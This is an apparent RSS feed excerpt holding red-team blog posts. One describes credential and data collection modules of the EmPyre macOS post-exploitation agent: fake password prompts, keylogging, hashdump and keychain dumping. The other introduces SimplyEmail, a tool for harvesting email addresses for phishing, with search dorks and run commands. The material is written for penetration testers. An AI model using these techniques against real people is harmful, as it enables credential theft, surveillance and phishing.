    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 50%; width: 50%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_logo.png&#34; alt=&#34;Empyre Logo&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    

This post is number 4 of the EmPyre series. Thanks to the entire ATD family and dev team of EmPyre:&lt;/p&gt;

&lt;p&gt;@rvrsh3ll — @harmj0y — @xorrior — @CptJesus&lt;/p&gt;

&lt;p&gt;EmPyre can be found here: &lt;a href=&#34;https://github.com/adaptivethreat/EmPyre&#34;&gt;https://github.com/adaptivethreat/EmPyre&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&#34;master-list-of-the-seriers-here-http-www-harmj0y-net-blog-empyre-building-an-empyre-with-python&#34;&gt;Master list of the seriers: &lt;a href=&#34;http://www.harmj0y.net/blog/empyre/building-an-empyre-with-python/&#34;&gt;Here&lt;/a&gt;&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;5/12/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://www.harmj0y.net/blog/?p=2637&amp;amp;preview=true&#34;&gt;Building an EmPyre with Python&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;5/18/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://Operating with EmPyre&#34;&gt;Operating with EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;5/24/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;https://www.xorrior.com/the-return-of-the-empyre/&#34;&gt;The Return Of the EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;5/31/16 – &lt;em&gt;&lt;strong&gt;&lt;a href=&#34;http://www.harmj0y.net/blog/empyre/os-x-office-macros-with-empyre/&#34;&gt;OS X Office Macros with EmPyre&lt;/a&gt;&lt;/strong&gt;&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;empyre-introduction-to-collection-operations&#34;&gt;&lt;strong&gt;EmPyre: Introduction to collection operations&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Information gathering may be one of the most vital actions to execute on a target. When it comes to EmPyre, we have implemented a suite of tools and techniques to accomplish a large subset of our needs. The interesting part about collection is it’s often used at nearly every phase of the attack cycle. This week we will be covering the various pre &amp;amp; post collection modules we have built!&lt;/p&gt;

&lt;h4 id=&#34;pre-escalation-collection-methods&#34;&gt;&lt;strong&gt;Pre-Escalation Collection Methods&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;One of our favorite, and easiest, methods is collecting a large subset of user information in OS X. Due the heavy use of SQL to store user information, it is extremely easy to query this data. For instance: with the “browser_dump” module we can start an operation to obtain browser history, which helps gain situational awareness of the target system. While this can be used in many scenarios, it is especially useful because the module does not require an elevated context; as such, it may give you pointers for the target you&amp;rsquo;re currently on. Once you are up and running in EmPyre you can dump our user’s browser history for Safari and Chrome.&lt;/p&gt;

&lt;p&gt;After quickly generating some history on my test VM we have data!&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/browser_dump_empyre.png&#34; alt=&#34;Empyre Browser Dump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Next up on SQL data: the iMessage data store! iMessage data store is used by many targets, and is often synced with iCloud (SMS and IMessage data). The interesting thing about the iMessage app is its ability to integrate multiple chat platforms - not just standard iMessaging from Apple. Examples of platforms with this funcionality include: Yahoo, Jabber, Aol, AIM, Google, etc.  Information collection through data mining is sometimes needed for additional escalation, and iMessage makes a great location to search for data like passwords. Using the “imessage_dump” module we can search for specific terms in the users iMessage data store. This will enumerate the following:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Account – The corresponding account user&lt;/li&gt;
&lt;li&gt;Service – The provider of the message&lt;/li&gt;
&lt;li&gt;Country – Where the message originated&lt;/li&gt;
&lt;li&gt;Number – If a text message, will be the senders telephone number&lt;/li&gt;
&lt;li&gt;ROWID – This is the row the message was stored, can be helpful if you pull the DB back&lt;/li&gt;
&lt;li&gt;Date – Date of the message&lt;/li&gt;
&lt;li&gt;Message – The text enumerated from the selected message&lt;/li&gt;
&lt;li&gt;Type – Secondary field for the type of account used within the app&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;



    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_message_dump.png&#34; alt=&#34;Empyre Message Dump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    

The next method of collection requires using osascript (Apples scripting language) we are able to force applications to prompt for credentials potentially gathering a password! Here is the “Prompt” module in action:&lt;/p&gt;

&lt;p&gt;



    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_prompt_attack.png&#34; alt=&#34;Empyre Message Dump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    

Once setup we can easily force the App of choice to prompt a dialog box requesting a password. This can be a great method to gather credentials and potentially escalate. This and the next module have been adapted from work from &lt;a href=&#34;https://twitter.com/fuzzynop?lang=en&#34;&gt;@FuzzyNop&lt;/a&gt;, so big shout out the work he puts in.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_prompt_attack2.png&#34; alt=&#34;Empyre Message Dump 2&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;One of my fellow friends, @enigma0x3 (&lt;a href=&#34;https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/&#34;&gt;https://enigma0x3.net/2015/01/21/phishing-for-credentials-if-you-want-it-just-ask/)&lt;/a&gt;) has an interesting technique to get credentials on engagments using the standard Windows login prompt. The great part is OS X has something similar we are able to implement into our collection strategy. Using the osascript method we can easily weaponize the “ScreenSaverEngine” application to request credentials.  We can force the standard screensaver, request creds, and test them against the current users Apple Key Chain. Using the &lt;strong&gt;security&lt;/strong&gt; command we can lock the users key chain and use the creds supplied to attempt to unlock using the follwing command: **security unlock-keychain –p Test. **This can be easily deployed in a loop to only unlock the screensaver when the user successfully enters the correct credentials. While it may not be extremely OPSEC friendly, it may go unnoticed and sucessfuly result in creds.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_screensaver_prompt.png&#34; alt=&#34;Empyre Screen Saver Prompt&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;A user will be prompted repeatedly until successful creds or the exit count is reached.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_screensaver_prompt2.png&#34; alt=&#34;Empyre Screen Saver Prompt2&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;One of the key collection modules we use during an engagment is clipboard collection. The main reason clipboard monitoring is key in our tradecraft is due to the ease of collection when keylogging fails to capture creds. This allows you to gather credentials and target specific times when password vaults are used in conjunction with the screenshot. Allowing for targeted collection of potential passwords and sensitive data. Using native API calls NSPasteboard, NSStringPboardType we can prevent using built in commands and potential signatures that could get us caught.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_clipboard_monitor.png&#34; alt=&#34;Empyre Clipboard monitor&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;h3 id=&#34;post-exploit-collection-methods&#34;&gt;&lt;strong&gt;Post-Exploit Collection Methods&lt;/strong&gt;&lt;/h3&gt;

&lt;p&gt;Often during operations, we move from a recon &amp;amp; escalation stage to a post exploitation information gathering process. This is truly the heart of end state operations and proper tools can help speed up the process as well as help a tester reach the data / show impact. When EmPyre was being developed we often attempted to explain and relate it to processes and procedures used during a windows environment.&lt;/p&gt;

&lt;p&gt;The first module I want to start with is the screenshot module. Due to testers reliance on this module it may be one of the most important post exploitation modules in our arsenal. While EmPyre currently supports two different techniques of screenshot, the native_screenshot module may be concern if certain AV products are in place. This is due to using the &lt;em&gt;screenshot&lt;/em&gt; command, and potential logging.  While the standard module uses system APIs to capture the screen, parse the image, and drop to disk in a temporary location. During my research I did uncover a few methods to properly parse all the images completely in memory, but currently due to lack of the PIL library standalone 2.7 does not have the ability to parse completely in memory.  So relying on the Quartz API is a current constraint in this method.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_native_screenshoot.png&#34; alt=&#34;Empyre Native Screenshot&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;One feature within the EmPyre code base is different tasking types. This allows for different code paths of execution. For example, the iMessage module used dynamic code execution while the screenshot uses dynamic code execution with saved output. This is done by dropping to disk, opening the file, base64ing the raw file and the EmPyre server, and then saving it to your downloads folder. This makes for easy file management for modules and keeps things organized.&lt;/p&gt;

&lt;p&gt;Once basic situational awareness has been completed on a target, we often transition to reaching end state client goals. This is often referred to as the “Crown Jewels” or high value targets. Generally, it takes a large amount of post exploitation intelligence and the ability to collect on all your endpoints. Keylogging is an amazing technique that has been extremely successful for gathering creds, enumerating users work roles, collecting info, or even understanding the tools they are using to interact with the asset. Bellow you will see this being employed using an adapted ruby keylogger. @ joev  (&lt;a href=&#34;https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.r&#34;&gt;https://github.com/gojhonny/metasploit-framework/blob/master/modules/post/osx/capture/keylog_recorder.r)&lt;/a&gt;)&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keylogger.png&#34; alt=&#34;Empyre Keylogger&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Once the key logger is up and running you can easily check it using the built in shell commands or once complete kill the PID, use the built in download, and delete the file from disk.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keylogger2.png&#34; alt=&#34;Empyre Keylogger&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Once the file has been retrieved from the target you will have something similar (to the below) representing the application, key stroke, and keyboard commands.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keylogger3.png&#34; alt=&#34;Empyre Keylogger 3&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;While operating on OS X you for sure miss the ease of mimikatz for gathering credentials, but while password collection is possible in some cases cracking potential evaluated accounts, admins or service accounts may be extremely useful for lateral movement. Within EmPyre we have built in the ability for hashdump and nicely output these hashes in hashcat ready format!&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_hashdump.png&#34; alt=&#34;Empyre Hashdump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;It is often thought that due to the out-of-the box setup that lateral movement is just not an option. This is not always the case in the corporate environments. Admins are generally going to administrate, right? They need some method of software, patch, or user management for their end points. This can result in SSH being deployed to most corporate OS X assets, or maybe a custom solution. While this blog does not cover the Kerberos implications, in corporate environments, due to the heavy use of Active Directory it can be an entirely new method of lateral movement. Stay tuned for more on that subject!&lt;/p&gt;

&lt;p&gt;The last module we will be covering is the keychaindump. While this module may result in a large subset of user data and crucial passwords it does have limitations. Currently, this will not work against the latest OS X platform. The latest usable version was Yosemite, due to a vulnerability that allowed for researches to pull the master key candidate from memory once in an elevated state. Due to the new System Integrity Protections (SIP) in El Captain the ability to retrieve this master key has been properly stored in memory protected by SIP.  Not all hope is lost though! I have been extremely successful in using other tools to parse the keychain with the user’s credentials. This can be done with either a memory image or the keychain file itself.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keychain_dump.png&#34; alt=&#34;Empyre Keychain Dump&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Once the keychain is local we can use a python tool called chainbreaker (&lt;a href=&#34;https://github.com/n0fate/chainbreaker&#34;&gt;https://github.com/n0fate/chainbreaker)&lt;/a&gt;). This allows for the use of the password or the master key and will parse and decrypt the entire keychain offline. While this requires the password, a root context is not needed to download the keychain, allowing for offline attempts against the keychain which can be quite useful.&lt;/p&gt;





    
    
        
        
        
        
        
    


    
    
    
    
    

    
    
        
    
    



    
    &lt;div style=&#34;display:flex;justify-content:center;align-items:center&#34;&gt;
        &lt;div style=&#34;height: 100%; width: 100%&#34;&gt;
            &lt;p&gt;
                &lt;img src=&#34;https://cybersyndicates.com/image/empyre_keychain_dump2.png&#34; alt=&#34;Empyre Keychain Dump2&#34;/&gt;
            &lt;/p&gt;
        &lt;/div&gt;
    &lt;/div&gt;
    


&lt;p&gt;Hopefully this has helped clear up different use cases when it comes to EmPyre collection operations and the corresponding modules. As always we plan to release blogs near weekly covering the different use cases of EmPyre, next the team will be covering the injection of Kerberos tickets&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Email Reconnaissance and Phishing Template Generation Made Simple</title>
      <link>https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/</link>
      <pubDate>Thu, 26 May 2016 21:56:58 +0000</pubDate>
      
      <guid>https://cybersyndicates.com/2016/05/email-reconnaissance-phishing-template-generation-made-simple/</guid>
      <description>

&lt;p&gt;&lt;strong&gt;Author: Alexander Rymdeko-Harvey, @Killswitch_GUI &lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;First a big thanks to the entire ATD (Adaptive Threat Divsion) team which contributed ideas, support and templates! &lt;a href=&#34;https://www.verisgroup.com/blog/category/adaptive-threat-division/&#34;&gt;https://verisgroup.com/blog/category/adaptive-threat-division/&lt;/a&gt; &lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://twitter.com/cptjesus&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @cptjesus&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/sixdub&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @sixdub&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/xorrior&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @xorrior&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/424f424f&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @424f424f&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/enigma0x3&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @enigma0x3&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/mattifestation&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @mattifestation&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/_wald0&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @_wald0&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;
&lt;a href=&#34;https://twitter.com/bluscreenofjeff&#34; class=&#34;twitter-follow-button&#34; data-show-count=&#34;false&#34;&gt;Follow @bluscreenofjeff&lt;/a&gt;&lt;script async src=&#34;//platform.twitter.com/widgets.js&#34; charset=&#34;utf-8&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;h4 id=&#34;email-reconnaissance-and-phishing-template-generation-made-simple&#34;&gt;Email Reconnaissance and Phishing Template Generation Made Simple&lt;/h4&gt;

&lt;p&gt;As a red-teamer or pen-tester, the need for tools that speed up the process is absolutely critical. While tools are not everything, they sure do help when it comes to performing an engagement within a short timeframe that a threat actor would have months to execute. With limited time and the need for effective methodologies, phishing can be a tester’s worst nightmare but also the best path to success. I found that proper reconnaissance and preparation are extremely important when it comes to phishing. I set out to speed up the process while still employing effective methodologies for upcoming and future engagements.&lt;/p&gt;

&lt;p&gt;TL;DR:
&lt;div class=&#34;github-card&#34; data-github=&#34;killswitch-gui/SimplyEmail&#34; data-width=&#34;400&#34; data-height=&#34;153&#34; data-theme=&#34;default&#34;&gt;&lt;/div&gt;
&lt;script src=&#34;//cdn.jsdelivr.net/github-cards/latest/widget.js&#34;&gt;&lt;/script&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Email Recon Methodology and name creation:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Over the past few months, I put quite a bit of time into research and current methods that are being used to perform email harvesting. While every tester has a few different methods to get the most out of their recon, most rely upon search indexing and searching for documents. Using this methodology is generally slow and takes up valuable time. One of the major concerns was the ability to cover as much content as possible, with so many documents and locations to search I often missed email data I should have caught.  I knew right away there was room for improvement.&lt;/p&gt;

&lt;p&gt;Using tools like theHarvester has been a great resource for myself and other testers. This tool uses Google and Bing to automatically scrape emails by parsing raw HTML. This tool is used often on engagements and was a huge inspiration to building out a few more features. Here are a few of the sources I knew would be gold mines:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;PasteBin&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Past data dumps&lt;/li&gt;
&lt;li&gt;Raw HTML of target site&lt;/li&gt;
&lt;li&gt;EmailHunter – &lt;a href=&#34;http://emailhunter.co&#34;&gt;http://emailhunter.co&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I discovered that using HTML parsing over more traditional API searches allows a user to search content that may not yet supply an API. This was the case for a ton of the resources that I wanted to target moving forward with my research. While API based searches have their place, I focused on free and easily accessible data for my gathering techniques. Using advanced Google search operators you can retrieve a list of all .xlsx files currently indexed on Google. Parsing the results was all done manually and finding them took some time.  “Google dorks” that I often employed during my recon phase:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Site:verisgroup.com filetype:doc &amp;ndash; Site: verisgroup.com filetype:docx&lt;/li&gt;
&lt;li&gt;Site: verisgroup.com filetype:xls &amp;ndash; Site: verisgroup.com filetype:doc&lt;/li&gt;
&lt;li&gt;Site: verisgroup.com filetype:pdf&lt;/li&gt;
&lt;li&gt;site:pastebin.com &amp;ldquo;@target.com&amp;rdquo;&lt;/li&gt;
&lt;li&gt;“@target.com”&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;When searching the web for emails, you have to get creative. An issue I found out early on was the reliability of indexed data, which has to do with indexing and other factors. But I found this out time and time again when it came to searching for new and interesting sources, such as Yahoo, Reddit, Ask, Whois Data, or even PGP keys. These queries may only find 1 or 2 more emails but in the long run, but they add up and you can show your client the visibility they have on the web.&lt;/p&gt;

&lt;p&gt;While email recon can get you a good start or initial vector of attack, covering a larger set of data or targets requires secondary techniques, in particular, inferring email addresses from names. This has been used and talked about pretty thoroughly. One tool that implements this technique is PhishBait (&lt;a href=&#34;https://github.com/pan0pt1c0n/PhishBait&#34;&gt;https://github.com/pan0pt1c0n/PhishBait)&lt;/a&gt;), which scrapes LinkedIn names from Bing to build out a potential email using predictable formats. Will Schroeder (@harmj0y) produced a to scrape names from Connect6 - a sourcing database of employees and their companies. Between these two sites, recent phishing campaigns have seen significantly more success. An example “Google dork” for Connect6:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;site:connect6.com target.com&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;During a standard test it can be useful to attempt to verify the emails gathered. Using the target’s mail server, we can test for SMTP return codes that could potentially support the verify behavior. This simply opens up a connection to the target SMTP server, starts to create a message for an internal recipient and checks for the return codes (250 or 550). By providing the SMTP server a known invalid address, the tester can test if it returns with a 250 code. If this is the case, the server is known as a “catch all”. If anything other than a 250 is returned, we are in luck and can verify the emails gathered and built from name generation!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;The Birth of SimplyEmail:&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;After months of performing the above methodology, consuming roughly a half day of a test time with inaccuracy, I knew there was room within the industry to build a tool that was focused on simplifying the process and improving the accuracy of the information gathered. Many tools built in the security industry have many facets and are generally Swiss army knives in their realm. I knew from the start that SimplyEmail had to do only (simply) email, backed by a framework that would allow other members on the team or industry contribute with ease. Thus, the concept of SimplyEmail was born, and has evolved in accuracy and capability in the email reconnaissance realm.&lt;/p&gt;

&lt;p&gt;Currently, SimplyEmail has 25 modules ranging in capabilities and fidelity. Major sources searched are:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;HTML scrape of the targets web site&lt;/li&gt;
&lt;li&gt;PasteBin&lt;/li&gt;
&lt;li&gt;Exalead search – PDF –XLSX – DOCX –PDF&lt;/li&gt;
&lt;li&gt;Google Search – PDF XLS/XLSX –DOC/DOCX –PDF&lt;/li&gt;
&lt;li&gt;PGP keys&lt;/li&gt;
&lt;li&gt;Instagram&lt;/li&gt;
&lt;li&gt;Reddit&lt;/li&gt;
&lt;li&gt;Ask Search&lt;/li&gt;
&lt;li&gt;Yahoo Search&lt;/li&gt;
&lt;li&gt;Whois Search&lt;/li&gt;
&lt;li&gt;GitHub user – Code – Gist&lt;/li&gt;
&lt;li&gt;Flickr&lt;/li&gt;
&lt;li&gt;Cannary Bin – API&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The SimplyEmail framework uses a Task controller and a Producer Consumer model that allows testers to easily write modules, while the framework handles parsing, process creation and formatting. To get started with SimplyEmail you simply:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    
  1. git clone &amp;lt;a href=&amp;quot;http://github.com/killswitch-GUI/SimplyEmail.git&amp;quot;&amp;gt;http://github.com/killswitch-GUI/SimplyEmail.git&amp;lt;/a&amp;gt;
  2. ./sh install.sh(Kali 2 or Debian Currently Supported) 
  3. ./SimplyEmail –l or ./SimplyEmail –h

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After the installation of SimplyEmail, it’s time to give it a go:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;  1. ./SimplyEmail –all –e YOURTARGET.com –n –verify
    –all = Use all modules
    –e = Your target domain
    –n = Names generation
    –Verify = Attempt to verify your discovered emails Address
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/2016/05/pic1.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic1.png&#34; alt=&#34;pic1&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;After the initial email scrape is complete name generation is conducted. Using the built-in LinkedIn Bing scraper, SimplyEmail will start building names using LinkedIn &amp;amp; Connect6:&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic2.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic2.png&#34; alt=&#34;pic2&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic3.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic3.png&#34; alt=&#34;pic3&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Next, name generation will be completed. SimplyEmail has two methods to determine the email format. First, it attempts to use EmailHunter’s JSON API to detect the format of the emails. If that fails, SimplyEmail has a built-in class designed to detect the following supported formats:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;{first}.{last} = &lt;a href=&#34;mailto:alex.alex@domain.com&#34;&gt;alex@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first}{last} = &lt;a href=&#34;mailto:jamesharvey@domain.com&#34;&gt;jamesharvey@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{f}{last} = &lt;a href=&#34;mailto:ajames@domain.com&#34;&gt;ajames@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{f}.{last} = &lt;a href=&#34;mailto:a.james@domain.com&#34;&gt;james@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first}{l} = &lt;a href=&#34;mailto:jamesh@domain.com&#34;&gt;jamesh@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first}.{l} = &lt;a href=&#34;mailto:j.amesh@domain.com&#34;&gt;amesh@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first}_{last} = &lt;a href=&#34;mailto:james_amesh@domain.com&#34;&gt;james_amesh@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;{first} = &lt;a href=&#34;mailto:james@domain.com&#34;&gt;james@domain.com&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic4.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic4.png&#34; alt=&#34;pic4&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Lastly, as testers, we all know the importance of reporting and the ability to digest the data we just captured. SimplyEmail has a few great reporting options that are built into the tool. The standard text report and HTML file that will show all non-unique emails with the corresponding sources where SimplyEmail found those emails.&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://cybersyndicates.com/wp-content/pic5.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic5.png&#34; alt=&#34;pic5&#34; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This generates a clean report on the sources queried and an ordered list of all emails gathered. This also allows for your report to show duplicate email address gathered, which is specifically handy in the case that you need to correlate an email to multiple sources. This helps clients and testers distinguish where trouble areas are and helps make recommendations based on external OSINT presence.  Of course, a standard text file with raw emails is also built.&lt;strong&gt; &lt;a href=&#34;https://cybersyndicates.com/wp-content/pic6.png&#34;&gt;&lt;img src=&#34;https://cybersyndicates.com/wp-content/pic6.png&#34; alt=&#34;pic6&#34; /&gt;&lt;/a&gt;&lt;/strong&gt;&lt;strong&gt; &lt;/strong&gt;&lt;/p&gt;

